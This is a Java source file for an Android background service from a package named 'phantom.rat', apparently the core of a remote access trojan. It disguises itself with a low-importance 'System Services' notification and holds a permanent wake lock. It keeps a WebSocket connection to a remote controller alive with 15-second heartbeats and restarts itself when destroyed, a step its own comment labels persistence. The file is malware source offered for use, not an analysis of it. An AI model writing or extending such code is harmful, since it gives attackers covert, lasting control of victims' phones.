package com.phantom.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

public class CoreService extends Service {
    private static final String CH = "phantom_core";
    private WebSocketClient client;
    private final Handler h = new Handler(Looper.getMainLooper());
    private PowerManager.WakeLock wl;

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "phantom:keep");
            wl.acquire();
        }
        startForegroundCompat();
        startClient();
        h.post(heartbeat);
    }

    private void startForegroundCompat() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel nc = new NotificationChannel(CH, "System Services", NotificationManager.IMPORTANCE_MIN);
            nc.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(nc);
            Notification n = new Notification.Builder(this, CH)
                    .setContentTitle("System Services")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setOngoing(true)
                    .build();
            startForeground(1, n);
        }
    }

    private final Runnable heartbeat = new Runnable() {
        @Override
        public void run() {
            if (client == null || !client.isAlive()) startClient();
            if (client != null) client.sendHeartbeat();
            h.postDelayed(this, 15000);
        }
    };

    private void startClient() {
        if (!hasNetwork()) return;
        try {
            if (client != null) client.close();
            client = new WebSocketClient(this);
            client.connect();
        } catch (Exception ignored) {}
    }

    private boolean hasNetwork() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm == null ? null : cm.getActiveNetworkInfo();
        return ni != null && ni.isConnected();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (client == null || !client.isAlive()) startClient();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (client != null) client.close();
        if (wl != null && wl.isHeld()) wl.release();
        // persistence: restart
        Intent i = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
